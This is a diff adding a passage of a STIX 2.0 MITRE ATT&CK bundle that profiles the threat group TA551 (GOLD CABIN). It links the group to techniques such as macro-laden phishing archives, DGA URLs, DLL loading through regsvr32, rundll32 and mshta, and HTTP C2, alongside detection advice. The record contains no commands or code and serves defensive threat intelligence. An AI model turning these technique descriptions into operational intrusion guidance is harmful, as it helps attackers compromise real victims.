@@ -1,0 +1,1977 @@
+{
+    "type": "bundle",
+    "id": "bundle--db44fafa-24cf-41e2-b979-6ad4ed35c365",
+    "spec_version": "2.0",
+    "objects": [
+        {   "primary_motivation": "personal-gain",
+            "first_seen":"2018",
+            "x_MISP-uuid": "36e8c848-4d20-47ea-9fc2-31aa17bf82d1",
+            "x_MISP-description": "GOLD CABIN is a financially motivated cybercriminal threat group operating a malware distribution service on behalf of numerous customers since 2018. GOLD CABIN uses malicious documents, often contained in password-protected archives, delivered through email to download and execute payloads. The second-stage payloads are most frequently Gozi ISFB (Ursnif) or IcedID (Bokbot), sometimes using intermediary malware like Valak. GOLD CABIN infrastructure relies on artificial appearing and frequently changing URLs created with a domain generation algorithm (DGA). The URLs host a PHP object that returns the malware as a DLL file.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "intrusion-set",
+            "name": "TA551",
+            "x_mitre_version": "1.1",
+            "modified": "2022-06-11T20:10:32.917Z",
+            "created_by_ref": "identity--cb4d3609-6db8-40ec-817d-43d0982b9130",
+            "aliases": [
+                "TA551",
+                "GOLD CABIN",
+                "Shathak",
+                "MAN1",
+                "Moskalvzapoe"
+            ],
+            "id": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) is a financially-motivated threat group that has been active since at least 2018. (Citation: Secureworks GOLD CABIN) The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. (Citation: Unit 42 TA551 Jan 2021)",
+            "x_mitre_contributors": [
+                "Shuhei Sasada, Cyber Defense Institute, Inc",
+                "Ryo Tamura, SecureBrain Corporation",
+                "Shotaro Hamamoto, NEC Solution Innovators, Ltd",
+                "Yusuke Niwa, ITOCHU Corporation",
+                "Takuma Matsumoto, LAC Co., Ltd"
+            ],
+            "created": "2021-03-19T21:04:00.692Z",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/groups/G0127",
+                    "external_id": "G0127",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "description": "(Citation: Secureworks GOLD CABIN)",
+                    "source_name": "GOLD CABIN"
+                },
+                {
+                    "description": "(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)",
+                    "source_name": "Shathak"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin",
+                    "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+                    "source_name": "Secureworks GOLD CABIN"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--0af12d0f-ef9e-40e7-8b70-d811f412125d",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used regsvr32.exe to load malicious DLLs.(Citation: Unit 42 Valak July 2020)",
+            "target_ref": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+            "modified": "2021-03-19T21:04:01.003Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.003Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--0ce8fbfc-10cf-4fd4-8314-5a3f184a986d",
+            "description": "(Citation: ATT QakBot April 2021)",
+            "target_ref": "malware--edc5e045-5401-42bb-ad92-52b5b2ee0de9",
+            "modified": "2021-10-12T18:16:40.807Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-09-30T12:58:59.406Z",
+            "external_references": [
+                {
+                    "url": "https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot",
+                    "description": "Morrow, D. (2021, April 15). The rise of QakBot. Retrieved September 27, 2021.",
+                    "source_name": "ATT QakBot April 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--5d881746-44f9-4865-86de-97253fc197fb",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has sent spearphishing attachments with password protected ZIP files.(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN)",
+            "target_ref": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
+            "modified": "2021-03-25T15:34:04.436Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.281Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin",
+                    "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+                    "source_name": "Secureworks GOLD CABIN"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--6a4eafba-a7fb-46d1-8c50-033e1e3d7409",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used encoded ASCII text for initial C2 communications.(Citation: Unit 42 Valak July 2020)",
+            "target_ref": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
+            "modified": "2021-03-24T14:10:06.828Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:00.997Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--9b222cfd-8b08-4843-8b08-32e2476aba36",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used obfuscated variable names in a JavaScript configuration file.(Citation: Unit 42 Valak July 2020)",
+            "target_ref": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
+            "modified": "2021-03-19T21:04:00.988Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:00.988Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--39a3fca6-cdf6-4053-b4fe-eb5d46fc729f",
+            "description": "(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN)",
+            "target_ref": "malware--ade37ada-14af-4b44-b36c-210eec255d53",
+            "modified": "2021-03-19T21:04:01.279Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.279Z",
+            "external_references": [
+                {
+                    "url": "https://www.cybereason.com/blog/valak-more-than-meets-the-eye",
+                    "description": "Salem, E. et al. (2020, May 28). VALAK: MORE THAN MEETS THE EYE . Retrieved June 19, 2020.",
+                    "source_name": "Cybereason Valak May 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin",
+                    "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+                    "source_name": "Secureworks GOLD CABIN"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--59ef906c-f395-427a-9cd5-30887a983516",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has hidden encoded data for malware DLLs in a PNG.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916",
+            "modified": "2021-03-25T15:34:04.391Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.248Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--297ca26b-2074-46ea-b81d-a0a5c6fe5ac0",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262",
+            "modified": "2021-03-25T15:34:04.434Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.267Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--356cef7e-2994-4e52-8985-e046e8cc5513",
+            "description": "(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN)",
+            "target_ref": "malware--5147ef15-1cae-4707-8ea1-bee8d98b7f1d",
+            "modified": "2021-03-19T21:04:01.259Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.259Z",
+            "external_references": [
+                {
+                    "url": "https://www.cybereason.com/blog/valak-more-than-meets-the-eye",
+                    "description": "Salem, E. et al. (2020, May 28). VALAK: MORE THAN MEETS THE EYE . Retrieved June 19, 2020.",
+                    "source_name": "Cybereason Valak May 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin",
+                    "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+                    "source_name": "Secureworks GOLD CABIN"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--93656c66-acfc-43b4-af66-bf328256b7b8",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used a DGA to generate URLs from executed macros.(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN)",
+            "target_ref": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
+            "modified": "2021-03-19T21:04:01.269Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.269Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin",
+                    "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+                    "source_name": "Secureworks GOLD CABIN"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--354551e4-c6aa-495a-aba5-b7437c485d34",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has prompted users to enable macros within spearphishing attachments to install malware.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+            "modified": "2021-03-25T15:34:04.468Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-24T14:10:06.717Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--58565141-69f5-45c4-a7a9-f3eec03f403b",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used rundll32.exe to load malicious DLLs.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+            "modified": "2021-03-19T21:04:01.008Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.008Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--c4953a3b-d674-4582-b644-1339ec097aad",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has retrieved DLLs and installer binaries for malware execution from C2.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+            "modified": "2021-03-19T21:04:01.261Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.261Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--c1349223-f356-4e0d-8148-bda128354347",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used HTTP for C2 communications.(Citation: Unit 42 Valak July 2020)",
+            "target_ref": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
+            "modified": "2021-03-19T21:04:01.014Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.014Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--df33a65c-1529-4f8d-a27b-0d00f540e6e6",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used mshta.exe to execute malicious payloads.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+            "modified": "2021-03-25T15:34:04.469Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-24T14:10:06.732Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--e52a9525-9209-4cf5-8f8e-43057ef6c2b3",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has used <code>cmd.exe</code> to execute commands.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
+            "modified": "2021-03-25T15:34:04.440Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.270Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--eca046f5-9175-4010-8297-07281f588934",
+            "description": "(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN)",
+            "target_ref": "malware--1492d0f8-7e14-4af3-9239-bc3fe10d3407",
+            "modified": "2021-03-19T21:04:01.283Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:01.283Z",
+            "external_references": [
+                {
+                    "url": "https://www.cybereason.com/blog/valak-more-than-meets-the-eye",
+                    "description": "Salem, E. et al. (2020, May 28). VALAK: MORE THAN MEETS THE EYE . Retrieved June 19, 2020.",
+                    "source_name": "Cybereason Valak May 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                },
+                {
+                    "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin",
+                    "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+                    "source_name": "Secureworks GOLD CABIN"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--f2e075b3-1125-4259-bf0b-1ff90c738354",
+            "description": "[TA551](https://attack.mitre.org/groups/G0127) has masked malware DLLs as dat and jpg files.(Citation: Unit 42 TA551 Jan 2021)",
+            "target_ref": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
+            "modified": "2021-03-19T21:04:00.991Z",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-03-19T21:04:00.991Z",
+            "external_references": [
+                {
+                    "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/",
+                    "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+                    "source_name": "Unit 42 TA551 Jan 2021"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-03-26T20:15:35.821Z",
+            "name": "Web Protocols",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Traffic Content"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2020-03-15T16:13:46.151Z",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
+            "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1071/001",
+                    "external_id": "T1071.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "University of Birmingham C2",
+                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-07-26T17:13:07.345Z",
+            "name": "Windows Command Shell",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Process: Process Creation"
+            ],
+            "x_mitre_version": "1.2",
+            "created": "2020-03-09T14:12:31.196Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
+            "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_remote_support": true,
+            "x_mitre_detection": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1059/003",
+                    "external_id": "T1059.003",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh",
+                    "description": "Microsoft. (2020, May 19). Tutorial: SSH in Windows Terminal. Retrieved July 26, 2021.",
+                    "source_name": "SSH in Windows"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Standard Encoding",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Content"
+            ],
+            "x_mitre_version": "1.0",
